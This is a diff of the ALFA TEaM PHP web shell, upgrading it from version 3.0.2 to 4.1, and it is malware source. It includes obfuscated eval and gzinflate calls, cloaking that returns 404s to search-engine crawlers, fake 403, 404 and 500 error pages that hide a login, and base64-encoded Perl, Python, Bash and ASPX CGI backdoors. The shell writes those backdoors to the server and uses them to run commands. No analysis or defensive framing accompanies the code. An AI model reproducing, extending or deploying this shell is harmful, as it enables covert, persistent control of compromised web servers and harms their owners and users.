@@ -1,17 +1,173 @@
 <?php
-$GLOBALS['NeUSMyPGXP'] = array(
-	'usmfzmlHFCje' => 'admin',//login username
-	'paLDRhHfAovu' => 'a6f452ec3293d7fb72c5b677257b20ec',//login password (MD5)... ehsan
-	'saEuEgnDlHuL' => '1',//safe mode.. 0 = allow, 1 = deny
-	'logXKTfQPNcx' => 'gui',//safe mode type.. gui = login and HTTP errors accepted: 500, 404, 403
-	'shiJVQhUrFkw' => '1',//show icons.. 0 = not show, 1 = show
-	'pogkUzMiAjqB' => true,//POST encryption
+/*
+	Author: 	Solevisible/Alfa-Team
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
+*/
+$GLOBALS['oZgNypoPRU'] = array(
+    'username' => 'alfa',
+    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
+    'safe_mode' => '0',
+    'login_page' => '403',
+    'show_icons' => '1',
+    'post_encryption' => false,
+    'cgi_api' => true,
 );
 
-$XDmfxOnhck='fu'.'nct'.'ion'.'_'.'e'.'x'.'is'.'ts'.'';$RxPWPyQqTL='cha'.'r'.'Cod'.'e'.'A'.'t'.'';$CyvIHOdCHU='e'.'va'.'l'.'';$jgpUDiTPrk='g'.'zi'.'nf'.'l'.'at'.'e'.'';if(!$XDmfxOnhck('bas'.'e'.'6'.'4_e'.'ncod'.'e'.'')){function nIWUkxhnhj($data){if(empty($data))return;$b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';$o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;$ac = 0;$enc = '';$tmp_arr = array();if(!$data){return $data;}do{$o1 = $RxPWPyQqTL($data, $i++);$o2 = $RxPWPyQqTL($data, $i++);$o3 = $RxPWPyQqTL($data, $i++);$bits = $o1 << 16 | $o2 << 8 | $o3;$h1 = $bits >> 18 & 0x3f;$h2 = $bits >> 12 & 0x3f;$h3 = $bits >> 6 & 0x3f;$h4 = $bits & 0x3f;$tmp_arr[$ac++] = charAt($b64, $h1).charAt($b64, $h2).charAt($b64, $h3).charAt($b64, $h4);} while ($i < strlen($data));$enc = implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).substr('===', ($r || 3));}function charCodeAt($data, $char){ return ord(substr($data, $char, 1));}function charAt($data, $char){return substr($data, $char, 1);}}else{function nIWUkxhnhj($s){$b='bas'.'e'.'6'.'4_e'.'ncod'.'e'.'';return $b($s);}}if(!$XDmfxOnhck('b'.'ase'.'6'.'4_deco'.'d'.'e')){function QFdAWqZnUX($input){if(empty($input))return;$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";$i = 0;$output = "";$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);do{$enc1 = strpos($keyStr, substr($input, $i++, 1));$enc2 = strpos($keyStr, substr($input, $i++, 1));$enc3 = strpos($keyStr, substr($input, $i++, 1));$enc4 = strpos($keyStr, substr($input, $i++, 1));$chr1 = ($enc1 << 2) | ($enc2 >> 4);$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);$chr3 = (($enc3 & 3) << 6) | $enc4;$output = $output . chr((int) $chr1);if ($enc3 != 64) {$output = $output . chr((int) $chr2);}if ($enc4 != 64) {$output = $output . chr((int) $chr3);}$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";}while($i < strlen($input));return $output;}}else{function QFdAWqZnUX($s){$b='b'.'ase'.'6'.'4_deco'.'d'.'e';return $b($s);}}$gEleJRqGNj='create_fun'.'ct'.'io'.'n';$oFcbuslxiL = $gEleJRqGNj('$cq',$CyvIHOdCHU.'('.$jgpUDiTPrk.'('.'Q'.'FdAW'.'qZ'.'n'.'U'.'X'.''.'($cq)'.')'.')'.';');
+$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
+$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
+$OVpGNqqFZs = 'e' . 'v' . 'al';
+$psDEwGhsxg = 'gz' . 'inf' . 'late';
 
-/* ufBAyNiLYhXtEhSseNmZlGuuOwOGcBLTnsgEApHxXujFVanOXqNpNWAMnYLMAGHaHTpIuoJkmboVlvpvaebpEaoskOINIUDeEhGI */ /* You're killing me again 🎧 Am I still in your head ? 🎧 You used to light me up 🎧 Now you shut me down -- Solevisible */ @session_start();function __ZW5jb2Rlcg($s){return nIWUkxhnhj($s);}function __ZGVjb2Rlcg($s){return QFdAWqZnUX($s);}$GLOBALS['DB_NAME'] = $GLOBALS['NeUSMyPGXP'];$check = false;if(!isset($_SESSION["alfa_settings_signature"])){$check = true;}else{if($_SESSION["alfa_settings_signature"] != md5(print_r($GLOBALS['DB_NAME'], true))){$check = true;}}if($check){$_SESSION["alfa_settings_signature"] = md5(print_r($GLOBALS['DB_NAME'], true));foreach($GLOBALS['NeUSMyPGXP'] as $key => $value){$prefix = substr($key, 0, 2);if($prefix == "us"){$GLOBALS['DB_NAME']["user"] = $value;$GLOBALS['DB_NAME']["user_rand"] = $key;}elseif($prefix == "pa"){$GLOBALS['DB_NAME']["pass"] = $value;$GLOBALS['DB_NAME']["pass_rand"] = $key;}elseif($prefix == "sa"){$GLOBALS['DB_NAME']["safemode"] = $value;$GLOBALS['DB_NAME']["safemode_rand"] = $key;}elseif($prefix == "lo"){$GLOBALS['DB_NAME']["login_page"] = $value;$GLOBALS['DB_NAME']["login_page_rand"] = $key;}elseif($prefix == "sh"){$GLOBALS['DB_NAME']["show_icons"] = $value;$GLOBALS['DB_NAME']["show_icons_rand"] = $key;}elseif($prefix == "po"){$GLOBALS['DB_NAME']["post_encryption"] = $value;$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;}}$_SESSION["alfa_db_settings"] = $GLOBALS['DB_NAME'];}else{$GLOBALS['DB_NAME'] = $_SESSION["alfa_db_settings"];}unset($GLOBALS['NeUSMyPGXP']); if(!isset($_SERVER["HTTP_HOST"]))exit();
+if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
+{
+    function vcnvSCZgBz($data)
+    {
+        if (empty($data)) return;
+        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
+        $ac = 0;
+        $enc = '';
+        $tmp_arr = array();
+        if (!$data)
+        {
+            return $data;
+        }
+        do
+        {
+            $o1 = $aztJtafUXm($data, $i++);
+            $o2 = $aztJtafUXm($data, $i++);
+            $o3 = $aztJtafUXm($data, $i++);
+            $bits = $o1 << 16 | $o2 << 8 | $o3;
+            $h1 = $bits >> 18 & 0x3f;
+            $h2 = $bits >> 12 & 0x3f;
+            $h3 = $bits >> 6 & 0x3f;
+            $h4 = $bits & 0x3f;
+            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
+        }
+        while ($i < strlen($data));
+        $enc = implode($tmp_arr, '');
+        $r = (strlen($data) % 3);
+        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
+    }
+    function charCodeAt($data, $char)
+    {
+        return ord(substr($data, $char, 1));
+    }
+    function charAt($data, $char)
+    {
+        return substr($data, $char, 1);
+    }
+}
+else
+{
+    function vcnvSCZgBz($s)
+    {
+        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
+        return $b($s);
+    }
+}
+if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
+{
+    function zRtSHsbTzV($input)
+    {
+        if (empty($input)) return;
+        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        $chr1 = $chr2 = $chr3 = "";
+        $enc1 = $enc2 = $enc3 = $enc4 = "";
+        $i = 0;
+        $output = "";
+        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
+        do
+        {
+            $enc1 = strpos($keyStr, substr($input, $i++, 1));
+            $enc2 = strpos($keyStr, substr($input, $i++, 1));
+            $enc3 = strpos($keyStr, substr($input, $i++, 1));
+            $enc4 = strpos($keyStr, substr($input, $i++, 1));
+            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
+            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
+            $chr3 = (($enc3 & 3) << 6) | $enc4;
+            $output = $output . chr((int)$chr1);
+            if ($enc3 != 64)
+            {
+                $output = $output . chr((int)$chr2);
+            }
+            if ($enc4 != 64)
+            {
+                $output = $output . chr((int)$chr3);
+            }
+            $chr1 = $chr2 = $chr3 = "";
+            $enc1 = $enc2 = $enc3 = $enc4 = "";
+        }
+        while ($i < strlen($input));
+        return $output;
+    }
+}
+else
+{
+    function zRtSHsbTzV($s)
+    {
+        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
+        return $b($s);
+    }
+}
 
+function __ZW5jb2Rlcg($s)
+{
+    return vcnvSCZgBz($s);
+}
+function __ZGVjb2Rlcg($s)
+{
+    return zRtSHsbTzV($s);
+}
+
+$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
+
+foreach ($GLOBALS['DB_NAME'] as $key => $value)
+{
+	$prefix = substr($key, 0, 2);
+	if ($prefix == "us")
+	{
+		$GLOBALS['DB_NAME']["user"] = $value;
+		$GLOBALS['DB_NAME']["user_rand"] = $key;
+	}
+	elseif ($prefix == "pa")
+	{
+		$GLOBALS['DB_NAME']["pass"] = $value;
+		$GLOBALS['DB_NAME']["pass_rand"] = $key;
+	}
+	elseif ($prefix == "sa")
+	{
+		$GLOBALS['DB_NAME']["safemode"] = $value;
+		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
+	}
+	elseif ($prefix == "lo")
+	{
+		$GLOBALS['DB_NAME']["login_page"] = $value;
+		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
+	}
+	elseif ($prefix == "sh")
+	{
+		$GLOBALS['DB_NAME']["show_icons"] = $value;
+		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
+	}
+	elseif ($prefix == "po")
+	{
+		$GLOBALS['DB_NAME']["post_encryption"] = $value;
+		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
+	}
+	elseif ($prefix == "cg")
+	{
+		$GLOBALS['DB_NAME']["cgi_api"] = $value;
+		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
+	}
+}
+
+unset($GLOBALS['oZgNypoPRU']);
+
+if (!isset($_SERVER["HTTP_HOST"])) exit();
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
 if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
@@ -20,12 +176,12 @@ if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemod
 if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
 if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
-date_default_timezone_set('Asia/Tehran');
-define("__ALFA_MD5NAME__", md5($_SERVER["SCRIPT_FILENAME"]));
-define("__ALFA_VERSION__", "3.0.2");
-define("__LAST_CWD__", "last_cwd_".__ALFA_MD5NAME__);
-define("__PATH_HISTORY__", "path_history_".__ALFA_MD5NAME__);
+define("__ALFA_VERSION__", "4.1");
+define("__ALFA_UPDATE__", "2");
+define("__ALFA_CODE_NAME__", "Tesla");
+define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
+define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
 		"shell_border" => array(
 			"key_color" => "#0E304A",
@@ -83,13 +239,13 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		"options_list" => array(
 			"key_color" => "#00FF00",
 			"multi_selector" => array(
-				".ajaxarea .header center a" => "color: {color};",
+				".content_options_holder .header center a" => "color: {color};",
 			)
 		),
 		"options_list:hover" => array(
 			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
-				".ajaxarea .header center a:hover" => "color: {color};",
+				".content_options_holder .header center a:hover" => "color: {color};",
 			)
 		),
 		"options_list_header" => array(
@@ -105,7 +261,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"Alfa+" => array(
-			"key_color" => "#27E8AE",
+			"key_color" => "#06ff0f",
 			"multi_selector" => array(
 				".alfa_plus" => "color: {color};font-weight: unset;",
 			)
@@ -331,14 +487,14 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"uploader_progress_bar" => array(
-			"key_color" => "#ff0000",
+			"key_color" => "#00ff00",
 			"multi_selector" => array(
-				"#up_bar" => "background-color: {color};",
+				".up_bar" => "background-color: {color};",
 			)
 		),
 		"mysql_tables" => "#00FF00",
 		"mysql_table_count" => "#67ABDF",
-		"copyright" => "#ff0000",
+		"copyright" => "#dfff00",
 		"scrollbar" => array(
 			"key_color" => "#1e82b5",
 			"multi_selector" => array(
@@ -354,15 +510,20 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 );
 $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
 $config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
-@session_start();
+//@session_start();
+@session_write_close();
+@ignore_user_abort(true);
+@set_time_limit(0);
+@ini_set('memory_limit', '-1');
+@ini_set("upload_max_filesize", "9999m");
 if($config['AlfaProtectShell']){
 $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
 $Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
 if($config['AlfaLoginPage'] == 'gui'){
-if(@$_SESSION["AlfaUser"] != $config['AlfaUser'] && @$_SESSION["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
 if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
-@$_SESSION["AlfaUser"] = $config['AlfaUser'];
-@$_SESSION["AlfaPass"] = @md5($config['AlfaPass']);
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo '
@@ -371,11 +532,11 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="" src="http://solevisible.com/images/alfa-iran.png" /></center>
+<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.' ~</b></font></th></tr>
+<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
 <tr><td bgcolor="black" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
@@ -388,39 +549,40 @@ body{background: black;}
 exit;
 }
 }elseif($config['AlfaLoginPage']=='500'){
-if(@$_SESSION["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
 if(@md5($_POST["password"])==$config['AlfaPass']){
-@$_SESSION["AlfaUser"] = $config['AlfaUser'];
-@$_SESSION["AlfaPass"] = @md5($config['AlfaPass']);
-header('location: '.$_SERVER["PHP_SELF"]);
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
 exit;
 }
 }elseif($config['AlfaLoginPage']=='403'){
-if(@$_SESSION["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
 if(@md5($_POST["password"])==$config['AlfaPass']){
-@$_SESSION["AlfaUser"] = $config['AlfaUser'];
-@$_SESSION["AlfaPass"] = @md5($config['AlfaPass']);
-header('location: '.$_SERVER["PHP_SELF"]);
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
 }elseif($config['AlfaLoginPage']=='404'){
-if(@$_SESSION["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
 if(@md5($_POST["password"])==$config['AlfaPass']){
-@$_SESSION["AlfaUser"] = $config['AlfaUser'];
-@$_SESSION["AlfaPass"] = @md5($config['AlfaPass']);
-header('location: '.$_SERVER["PHP_SELF"]);
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
 }
 }
-function decrypt_post($str, $pwd){
+function decrypt_post($str){
 	if(__ALFA_POST_ENCRYPTION__){
+		$pwd = __ALFA_SECRET_KEY__;
 		$pwd     = __ZW5jb2Rlcg($pwd);
 		$str     = __ZGVjb2Rlcg($str);
 		$enc_chr = "";
@@ -442,10 +604,12 @@ function decrypt_post($str, $pwd){
 }
 
 function _AlfaSecretKey(){
-	if(!isset($_SESSION["AlfaSecretKey"])){
-		$_SESSION["AlfaSecretKey"] = uniqid(mt_rand(), true);
+	$secret = @$_COOKIE["AlfaSecretKey"];
+	if(!isset($_COOKIE["AlfaSecretKey"])){
+		$secret = uniqid(mt_rand(), true);
+		__alfa_set_cookie("AlfaSecretKey", $secret);
 	}
-	return $_SESSION["AlfaSecretKey"];
+	return $secret;
 }
 function alfa_getColor($target){
 	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
@@ -496,8 +660,11 @@ echo 'alfa'.$alfa."_=";
 }
 echo '""</script>';
 }}
-function _alfa_cgicmd($cmd,$lang="perl"){
-	if(isset($_SESSION["alfacgiapi_mode"])){
+function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
+	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
+		return "";
+	}
+	if(isset($_COOKIE["alfacgiapi_mode"])){
 		return "";
 	}
 	$cmd_pure = $cmd;
@@ -505,49 +672,72 @@ function _alfa_cgicmd($cmd,$lang="perl"){
 	$is_socket = function_exists('fsockopen');
 	if($is_curl||$is_socket){
 		$recreate = false;
-		if(isset($_SESSION["alfacgiapi"])){
-			if(!@file_exists("alfacgiapi/".$_SESSION["alfacgiapi"].".alfa")){
+		if(isset($_COOKIE["alfacgiapi"])){
+			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
 				$recreate = true;
-				$lang = $_SESSION["alfacgiapi"];
+				$lang = $_COOKIE["alfacgiapi"];
 			}
 		}
-		if(!isset($_SESSION["alfacgiapi"])||$recreate){
+		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
 			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
 			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
 			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
 			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
+			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
 			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
-			alfaWriteTocgiapi($lang.".alfa",$source);
+			if($lang == "aspx"){
+				alfaWriteTocgiapi("aspx.aspx",$aspx);
+			}else{
+				alfaWriteTocgiapi($lang.".alfa",$source);
+			}
 			alfacgihtaccess('cgi', "alfacgiapi/");
 		}else{
-			$lang = $_SESSION["alfacgiapi"];
+			$lang = $_COOKIE["alfacgiapi"];
 		}
+		$cgi_ext = ".alfa";
+		if($lang=="aspx"){
+			$cgi_ext = ".aspx";
+		}
+		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
 		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
 		if($is_curl){
-			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/alfacgiapi/".$lang.".alfa";
+			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
 			$post = new AlfaCURL();
 			$data = $post->Send($address, "post", $cmd);
 		}elseif($is_socket){
 			$server = $_SERVER["SERVER_NAME"];
-			$uri = dirname($_SERVER["REQUEST_URI"])."/alfacgiapi/".$lang.".alfa";
+			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
 			$data = _alfa_fsockopen($server,$uri,$cmd);
 		}
 		$out = "";
-		if(strstr($data, "[solevisible~api]")){
-			$_SESSION["alfacgiapi"] = $lang;
+		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
+			if($set_cookie){
+				__alfa_set_cookie("alfacgiapi", $lang);
+			}
 			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
 				$out = $res[1];
 			}
 		}elseif($lang=="perl"){
-			return _alfa_cgicmd($cmd_pure,"py");
+			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
 		}elseif($lang=="py"){
-			return _alfa_cgicmd($cmd_pure,"bash");
+			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
+		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
+			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
 		}else{
-			$_SESSION["alfacgiapi_mode"] = "off";
+			if($set_cookie){
+				__alfa_set_cookie("alfacgiapi_mode", "off");
+			}
 		}
 		return trim($out);
 	}else{
 		return "";
+	}
+}
+function alfaGetCwd(){
+	if(function_exists("getcwd")){
+		return @getcwd();
+	}else{
+		return dirname($_SERVER["SCRIPT_FILENAME"]);
 	}
 }
 function alfaEx($in,$re=false,$cgi=true,$all=false){
@@ -634,7 +824,7 @@ if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: 
 echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
 echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
 echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
